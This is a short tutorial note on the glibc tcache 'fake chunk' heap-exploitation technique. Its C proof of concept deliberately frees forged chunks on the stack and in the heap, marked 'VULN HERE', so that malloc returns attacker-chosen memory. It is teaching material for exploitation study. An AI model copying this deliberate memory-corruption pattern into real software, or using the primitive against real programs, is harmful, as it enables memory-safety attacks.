## tcache fake chunk

**Purpose**: Effectively write some data somewhere in memory we know, to make it look like a heap chunk.

**Mitigation**: Nothing to bypass, since tcache doesn't have many protections.

## PoC

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    long *ptr1[10], *ptr2, *chunk0, *chunk1;
    malloc(1); // init heap

    ptr1[0] = 0x0; // prev_size (ignored)
    ptr1[1] = 0x21; // size (must be in tcache range)
    ptr1[2] = 0; // fd (ignored)
    ptr1[3] = 0; // bk (ignored)

    /* VULN HERE */
    free(&ptr1[2]);
    /* VULN HERE */

    // create fake chunk inside a large chunk
    ptr2 = malloc(0x50);
    ptr2[0] = 0x0; // prev_size (ignored)
    ptr2[1] = 0x21; // size (must be in tcache range)
    ptr2[2] = 0; // fd (ignored)
    ptr2[3] = 0; // bk (ignored)

    /* VULN HERE */
    free(&ptr2[2]);
    /* VULN HERE */

    chunk0 = malloc(0x10); // from ptr2
    chunk1 = malloc(0x10); // from ptr1

    printf("chunk0: %p\n", chunk0);
    printf("chunk1: %p\n", chunk1);

    return 0;
}
```
